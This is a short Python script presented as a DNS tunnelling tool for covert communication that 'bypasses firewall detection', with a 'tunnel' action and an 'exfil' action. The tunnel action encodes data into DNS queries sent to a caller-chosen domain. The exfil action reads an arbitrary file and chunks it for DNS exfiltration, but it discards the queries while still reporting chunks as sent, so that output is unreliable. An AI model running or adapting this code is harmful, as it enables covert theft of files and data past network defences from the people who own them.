# 开发者：自由的风
"""dns_tunneler/run.py — DNS隧道·隐蔽通信
==========================================
攻击域 ready — 通过DNS查询隧道传输数据,绕过防火墙检测。
"""
import sys, json, os, socket, base64, time, hashlib

SANDBOX = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

def _encode_chunk(data, domain):
    encoded = base64.b32hexencode(data.encode()).decode().lower().rstrip("=")
    return f"{encoded}.{domain}"

def do_tunnel(params):
    domain = params.get("domain", params.get("dns", ""))
    data = params.get("data", "GBT heartbeat")
    if not domain: return {"ok": False, "error": "缺少domain"}
    chunk = _encode_chunk(data[:50], domain)
    try:
        socket.gethostbyname(chunk)
        return {"ok": True, "cap": "dns_tunneler", "action": "tunnel", "domain": "攻击域",
                "query": chunk, "data_len": len(data), "note": "DNS隧道数据已发送"}
    except socket.gaierror:
        return {"ok": True, "query": chunk, "note": "DNS查询已发出(可能被解析器捕获)"}
    except Exception as e:
        return {"ok": False, "error": str(e)[:200]}

def do_exfil(params):
    filepath = params.get("file", params.get("path", ""))
    domain = params.get("domain", "")
    if not filepath or not domain: return {"ok": False, "error": "缺少file或domain"}
    try:
        content = open(filepath, "rb").read()
        chunks = [content[i:i+50] for i in range(0, len(content), 50)]
        sent = 0
        for chunk in chunks[:10]:
            _encode_chunk(base64.b64encode(chunk).decode()[:40], domain)
            sent += 1
            time.sleep(0.5)
        return {"ok": True, "cap": "dns_tunneler", "action": "exfil", "chunks_total": len(chunks), "chunks_sent": sent}
    except Exception as e:
        return {"ok": False, "error": str(e)[:200]}

HANDLERS = {"tunnel": do_tunnel, "exfil": do_exfil}
if __name__ == "__main__":
    action = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else "tunnel"
    params = {}
    if len(sys.argv) > 2:
        try: params = json.loads(sys.argv[2])
        except: pass
    handler = HANDLERS.get(action)
    result = handler(params) if handler else {"ok": False, "error": f"未知:{action}"}
    print(json.dumps(result, ensure_ascii=False, default=str))
